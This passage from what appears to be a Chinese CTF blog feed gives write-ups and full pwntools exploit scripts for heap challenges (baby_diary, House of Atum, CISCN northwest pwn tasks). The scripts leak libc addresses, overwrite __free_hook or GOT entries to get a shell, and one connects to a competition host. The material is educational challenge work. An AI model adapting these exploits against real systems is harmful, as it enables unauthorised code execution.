大小触发不了malloc_consolidate</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">for i in range(7):</span><br><span class="line">    dele(11-i)</span><br><span class="line"></span><br><span class="line">dele(12)</span><br><span class="line">dele(16)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x37,&#x27;5&#x27;)</span><br><span class="line"></span><br><span class="line">add(0x410,&#x27;12&#x27;)#12 malloc_consolidate</span><br><span class="line">add(0x37,&#x27;\x30&#x27;+&#x27;\x00&#x27;*7)#16</span><br><span class="line">add(0x37,p64(0)+p64(0x301))#19 fd-&gt;bk = p</span><br></pre></td></tr></table></figure><p>后面就是使bk-&gt;fd=p和前面的一样没有什么重要的点了。</p><p>完整exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./baby_diary&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line"></span><br><span class="line">def add(a1,a2):</span><br><span class="line">    io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;size: &#x27;,str(a1))</span><br><span class="line">    io.sendlineafter(&#x27;content: &#x27;,a2)</span><br><span class="line"></span><br><span class="line">def show(a1):</span><br><span class="line">    io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;index: &#x27;,str(a1))</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">    io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;index: &#x27;,str(a1))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(0x57,&#x27;0&#x27;)#0</span><br><span class="line">    add(0x1007,&#x27;1&#x27;)#1</span><br><span class="line">    add(0x77,&#x27;2&#x27;)#2</span><br><span class="line">    add(0xf7,&#x27;3&#x27;)#3</span><br><span class="line">    add(0xf7,&#x27;4&#x27;)#4</span><br><span class="line"></span><br><span class="line">    for i in range(7):</span><br><span class="line">        add(0x37,&#x27;5&#x27;)#5~11</span><br><span class="line"></span><br><span class="line">    dele(1)</span><br><span class="line">    add(0x1017,&#x27;1&#x27;)#1</span><br><span class="line">    add(0x37,&#x27;12&#x27;)#12</span><br><span class="line">    add(0x37,&#x27;13&#x27;)#13</span><br><span class="line">    add(0x37,&#x27;14&#x27;)#14</span><br><span class="line">    add(0x47,&#x27;15&#x27;)#15</span><br><span class="line">    add(0x37,&#x27;16&#x27;)#16</span><br><span class="line">    add(0x170,&#x27;17&#x27;)#17</span><br><span class="line">    add(0x37,&#x27;18&#x27;)#18</span><br><span class="line"></span><br><span class="line">    for i in range(7):</span><br><span class="line">        dele(11-i)</span><br><span class="line"></span><br><span class="line">    dele(12)</span><br><span class="line">    dele(16)</span><br><span class="line"></span><br><span class="line">    for i in range(7):</span><br><span class="line">        add(0x37,&#x27;5&#x27;)</span><br><span class="line"></span><br><span class="line">    add(0x410,&#x27;12&#x27;)#12 malloc_consolidate</span><br><span class="line">    add(0x37,&#x27;\x30&#x27;+&#x27;\x00&#x27;*7)#16</span><br><span class="line">    add(0x37,p64(0)+p64(0x301))#19 fd-&gt;bk = p</span><br><span class="line"></span><br><span class="line">    for i in range(7):</span><br><span class="line">        dele(11-i)</span><br><span class="line"></span><br><span class="line">    dele(13)</span><br><span class="line">    dele(19)</span><br><span class="line"></span><br><span class="line">    for i in range(7):</span><br><span class="line">        add(0x37,&#x27;5&#x27;)#5</span><br><span class="line"></span><br><span class="line">    add(0x37,&#x27;&#x27;)#13 bk-&gt;fd = p</span><br><span class="line">    dele(18)</span><br><span class="line">    add(0x37,&#x27;\x00&#x27;*0x37)</span><br><span class="line">    dele(18)</span><br><span class="line">    add(0x37,&#x27;\x00&#x27;*0x2f+&#x27;\x30&#x27;)</span><br><span class="line">    dele(12)</span><br><span class="line">    add(0x37,&#x27;12&#x27;)#120x340</span><br><span class="line">    add(0x27,&#x27;20&#x27;)#19</span><br><span class="line">    add(0x37,&#x27;21&#x27;)#20</span><br><span class="line">    show(14)</span><br><span class="line">    malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">    libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line"></span><br><span class="line">    free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    system = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    add(0x27,&#x27;22&#x27;)#21</span><br><span class="line">    add(0x10,&#x27;23&#x27;)#22</span><br><span class="line">    dele(21)</span><br><span class="line">    dele(19)</span><br><span class="line">    dele(13)</span><br><span class="line">    add(0x37,p64(0)+p64(0x31)+p64(free_hook-0x10))</span><br><span class="line">    add(0x27,&#x27;19&#x27;)</span><br><span class="line">    add(0x27,&#x27;/bin/sh\x00&#x27;*2+p64(system))#21</span><br><span class="line">    dele(21)</span><br><span class="line">    io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>house of atum</title>
      <link href="/2021/06/11/house-of-atum/"/>
      <url>/2021/06/11/house-of-atum/</url>
      
        <content type="html"><![CDATA[<p><strong>house of atum 学习笔记</strong></p><span id="more"></span><p><em>跟着《ctf权威指南（pwn篇）》这本书来学习pwn，准备把这本书的例题一个一个认真啃完。</em></p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p>当申请chunk的大小被固定时，无法将chunk放入unsorted，且允许获取的chunk很少时。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>tcache bin中的chunk的next指针与fastbins的fd指针位置不匹配。如果fastbins中有多个chunk，且tcache中的chunk未填满，<strong>则当从fastbins中获得了一个chunk后，剩余的chunk会被整合到tcache中（整合到tcache满为止，smallbin相同）</strong>。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>释放8个相同的chunk（大小满足fastbins），这样第8个freechunk将会被放入fastbins中，且fd指针会被置为0，又因为释放的是相同的chunk，所以tcache中也只有一个freechunk。申请一个chunk（将会从tcahe中获得）将获得的chunk中的fd指针改为chunk-0x20，这时，在fastbins中的chunk的fd指针会变为chunk-0x10，再申请一个chunk，将会从fastbins中获取，但tcache的counts是6，所以在fastbins中剩余的一个freechunk（chunk-0x10）被放入tcache中，这样就能控制chunk的prev_size和size了。</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>House of Atum</p><p>保护全开，libc-2.27</p><p><img src="/2021/06/11/house-of-atum/image-20210611211956567.png" class="lazyload placeholder" data-srcset="/2021/06/11/house-of-atum/image-20210611211956567.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210611211956567"></p><p>正常的菜单题，只允许申请两个chunk，有edit，show函数，漏洞在dele函数中</p><p><img src="/2021/06/11/house-of-atum/image-20210611212307188.png" class="lazyload placeholder" data-srcset="/2021/06/11/house-of-atum/image-20210611212307188.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210611212307188"></p><p>先申请两个chunk，记为chunk0、chunk1。**chunk1需要写入<code>p64(0)*7+p64(0x11)</code>**，这一步是为了防止后面修改chunk的size后对其进行释放时报错。先连续释放6次chunk1，可以泄露heap_base。</p><p>再连续释放2次chunk0，使tcache和fastbins中都只有一个freechunk0.接着申请一个chunk，并写入chunk0-0x20，再申请一个chunk1。释放chunk1，再次申请，此时写入<code>p64(0)+p64(0x91)</code>，就相当于修改了chunk0的size域，再释放8次chunk0，泄露得到libcbase。再修改free_hook为 system函数，拿到shell。</p><p>完整exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./houseofAtum&#x27;)</span><br><span class="line">elf = ELF(&#x27;./houseofAtum&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context(log_level = &#x27;debug&#x27;)</span><br><span class="line">def add(a1):</span><br><span class="line">    io.sendlineafter(&#x27;choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;content:&#x27;,a1)</span><br><span class="line"></span><br><span class="line">def edit(a1,a2):</span><br><span class="line">    io.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;idx:&#x27;,str(a1))</span><br><span class="line">    io.sendafter(&#x27;content:&#x27;,a2)</span><br><span class="line"></span><br><span class="line">def dele(a1,a2):</span><br><span class="line">    io.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;idx:&#x27;,str(a1))</span><br><span class="line">    io.sendlineafter(&#x27;(y/n):&#x27;,a2)</span><br><span class="line"></span><br><span class="line">def show(a1):</span><br><span class="line">    io.sendlineafter(&#x27;choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;idx:&#x27;,str(a1))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(&#x27;0&#x27;)</span><br><span class="line">    payload = p64(0)*7+p64(0x11)</span><br><span class="line">    add(payload)</span><br><span class="line">    for i in range(5):</span><br><span class="line">        dele(1,&#x27;n&#x27;)</span><br><span class="line">    show(1)</span><br><span class="line">    io.recvuntil(&#x27;Content:&#x27;)</span><br><span class="line">    heap_base = u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))-0x2a0</span><br><span class="line">    print(hex(heap_base))</span><br><span class="line"></span><br><span class="line">    dele(1,&#x27;y&#x27;)</span><br><span class="line">    dele(0,&#x27;n&#x27;)</span><br><span class="line">    dele(0,&#x27;y&#x27;)</span><br><span class="line">    payload = p64(heap_base+0x250-0x20)</span><br><span class="line">    #pause()</span><br><span class="line">    add(payload)</span><br><span class="line">    add(&#x27;1&#x27;)</span><br><span class="line">    #pause()</span><br><span class="line">    dele(1,&#x27;y&#x27;)</span><br><span class="line">    payload = p64(0)+p64(0x91)</span><br><span class="line">    add(payload)</span><br><span class="line">    #pause()</span><br><span class="line">    for i in range(7):</span><br><span class="line">        dele(0,&#x27;n&#x27;)</span><br><span class="line">    dele(0,&#x27;y&#x27;)</span><br><span class="line">    edit(1,&#x27;a&#x27;*0x10)</span><br><span class="line">    #pause()</span><br><span class="line">    show(1)</span><br><span class="line">    io.recvuntil(&#x27;Content:&#x27;)</span><br><span class="line">    io.recv(0x10)</span><br><span class="line">    malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;,timeout=1)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">    libcbase = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(hex(libcbase))</span><br><span class="line">    system = libcbase + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    free_hook = libcbase + libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line"></span><br><span class="line">    edit(1,p64(0)+p64(0x51)+p64(free_hook-0x20))</span><br><span class="line">    payload = p64(free_hook-0x10)</span><br><span class="line">    add(payload)</span><br><span class="line">    dele(0,&#x27;y&#x27;)</span><br><span class="line">    payload = &#x27;/bin/sh\x00&#x27;*2+p64(system)</span><br><span class="line">    add(payload)</span><br><span class="line">    io.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;idx:&#x27;,&#x27;0&#x27;)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn 西北分区赛部分pwn</title>
      <link href="/2021/06/11/ciscn-%E8%A5%BF%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9B%E9%83%A8%E5%88%86pwn/"/>
      <url>/2021/06/11/ciscn-%E8%A5%BF%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9B%E9%83%A8%E5%88%86pwn/</url>
      
        <content type="html"><![CDATA[<p><strong>ciscn 西北分区赛部分pwn</strong></p><span id="more"></span><h2 id="xb-pwn-easy"><a href="#xb-pwn-easy" class="headerlink" title="xb_pwn_easy"></a>xb_pwn_easy</h2><p>分析发现是道整数溢出的题，unsigned int8最大数为255，当输入的数字超出255时就会发生溢出。但当时做题我将v4输为0，也可以造成溢出，原因是read的第三个参数v4-1=-1，又read的第三个参数类型是size_t，当输入负值时，会将其转换为无符号数。<br><img src="https://img-blog.csdnimg.cn/20210607182238148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210607182238148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><br>利用整数溢出漏洞，可以覆盖age、email、phone，可以将email覆盖为函数的got地址，这样就可以获得函数的地址并且得到libc的基地址。<br><img src="https://img-blog.csdnimg.cn/20210607184540857.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210607184540857.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p><p>修改puts函数的got表。一开始我将phone覆盖为puts_got的值，再利用edit函数将其改写为system函数的地址+‘||/bin/sh\x00’，但是报错，原因应该是system函数地址有两个‘\x00’，截断了‘||/bin/sh\x00’。改为onegadget即能打通。<br><img src="https://img-blog.csdnimg.cn/20210607190259112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210607190259112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><br>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./pwn&#x27;)</span><br><span class="line">io = remote(&#x27;172.1.28.5&#x27;,8888)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context(log_level = &#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">io.sendlineafter(&#x27;name&gt; &#x27;,&#x27;aaaa&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;email&gt; &#x27;,&#x27;bbbb&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;phone&gt; &#x27;,&#x27;cccc&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;age&gt; &#x27;,&#x27;18&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;size&gt; &#x27;,&#x27;0&#x27;)</span><br><span class="line">payload = &#x27;a&#x27;*0x28+p64(read_got)+p64(0)+p64(puts_got)+p64(0x20)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">#sleep(1)</span><br><span class="line">io.recvuntil(&#x27;temail&gt; &#x27;,timeout=1)</span><br><span class="line">#sleep(1)</span><br><span class="line">read = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libcbase = read - libc.symbols[&#x27;read&#x27;]</span><br><span class="line">print(hex(libcbase))</span><br><span class="line">system = libcbase+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">onegadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;phone? &gt;&#x27;,&#x27;y&#x27;)</span><br><span class="line">#sleep(1)</span><br><span class="line">raw_input()</span><br><span class="line">io.sendlineafter(&#x27;&gt; &#x27;,p64(onegadget[3]+libcbase))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="xb-pwn-enc-system"><a href="#xb-pwn-enc-system" class="headerlink" title="xb_pwn_enc_system"></a>xb_pwn_enc_system</h2><p>保护全开，分析出漏洞在strlen函数那，strlen遇到’\x00’停止，当我们将chunk填满时，下一个chunk的size处就会被strlen算入，然后被异或造成一个字节的off-by-one漏洞。<br><img src="https://img-blog.csdnimg.cn/2021060719251554.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/2021060719251554.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p><p>先申请3个大小为0x110的chunk，第一个chunk的密钥处填为0xb0，因为0x21^0xb0=0x91，在释放掉被更改了size域的chunk即可造成堆块堆叠。<br>gift函数可以申请1~512大小的chunk，但只能申请一次，利用此函数可以申请刚刚释放掉的被更改了size域的chunk。这时我们就可以控制tcache的0x110部分的freechunk。我们通过填充一定量的垃圾数据来泄露heap_base。<br><img src="https://img-blog.csdnimg.cn/20210607211626246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210607211626246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">add(0,0x108,0xb0)  </span><br><span class="line">   add(1,0x108,0)</span><br><span class="line">   add(2,0x108,1)</span><br><span class="line">   payload = &#x27;a&#x27;*0x108</span><br><span class="line">   encry(0,payload)</span><br><span class="line">   payload = &#x27;a&#x27;*0x68+&#x27;\xa1&#x27;+&#x27;\x00&#x27;</span><br><span class="line">   encry(1,payload)</span><br><span class="line">   #pause()</span><br><span class="line">   dele(0)</span><br><span class="line">   dele(2)</span><br><span class="line">   dele(1)</span><br><span class="line">   gift(1,0x88,0)</span><br><span class="line">   #pause()</span><br><span class="line">   payload = &#x27;a&#x27;*0x28</span><br><span class="line">   encry(1,payload)</span><br><span class="line">   io.recvuntil(&#x27;61&#x27;*0x28)</span><br><span class="line">   heap_base = io.recv(12)</span><br><span class="line">   news=&#x27;&#x27;</span><br><span class="line">   while(len(heap_base)):</span><br><span class="line">       news += heap_base[-2:]</span><br><span class="line">       heap_base = heap_base[:-2]</span><br><span class="line">   heap_base = int(news,16)</span><br><span class="line">   print(hex(heap_base))</span><br></pre></td></tr></table></figure><p>接着我们将freechunk的fd指针与(heap_base&gt;&gt;12)异或即可使fd指向heap_base。再连续两次申请0x110的chunk即可控制tcache。将0x110对应的chunk的counts设置为7，然后释放掉一个chunk，填充一定垃圾数据泄露main_arena的地址，得到libc的基地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;a&#x27;*0x18+p64(0x111)+p64(heap_base^heap_base&gt;&gt;12)</span><br><span class="line">decry(1)</span><br><span class="line">encry(1,payload)</span><br><span class="line">#pause()</span><br><span class="line">add(0,0x108,0)</span><br><span class="line">add(2,0x108,0)#tcache</span><br><span class="line">#pause()</span><br><span class="line">payload = &#x27;\x00&#x27;*0x1e+&#x27;\x07\x00&#x27;+&#x27;\x00&#x27;*0x60</span><br><span class="line">encry(2,payload)</span><br><span class="line">dele(0)</span><br><span class="line">decry(2)</span><br><span class="line">payload = &#x27;\x01&#x27;+&#x27;\x00&#x27;*0x7f</span><br><span class="line">encry(2,payload)</span><br><span class="line">decry(1)</span><br><span class="line">encry(1,&#x27;a&#x27;*0x21)</span><br><span class="line">decry(1)</span><br><span class="line">io.recvuntil(&#x27;61&#x27;*0x21)</span><br><span class="line">main_arena = io.recv(10)</span><br><span class="line">news=&#x27;&#x27;</span><br><span class="line">while(len(main_arena)):</span><br><span class="line">    news += main_arena[-2:]</span><br><span class="line">    main_arena = main_arena[:-2]</span><br><span class="line">main_arena = int(news,16)</span><br><span class="line">#print(hex(main_arena&lt;&lt;8))</span><br><span class="line">main_arena = main_arena&lt;&lt;8</span><br><span class="line">malloc_hook = main_arena-96-16</span><br><span class="line">libcbase = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">system = libcbase+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">print(hex(libcbase))</span><br><span class="line">free_hook = libcbase+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">print(&#x27;free_hook&#x27;,hex(free_hook))</span><br><span class="line">encry(1,&#x27;a&#x27;*0x18+p64(0x111)+&#x27;\x00&#x27;)</span><br><span class="line">decry(1)</span><br><span class="line">#pause()</span><br></pre></td></tr></table></figure><p>最后改写free_hook的值为system的地址，即可拿到shell。<br>完整exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 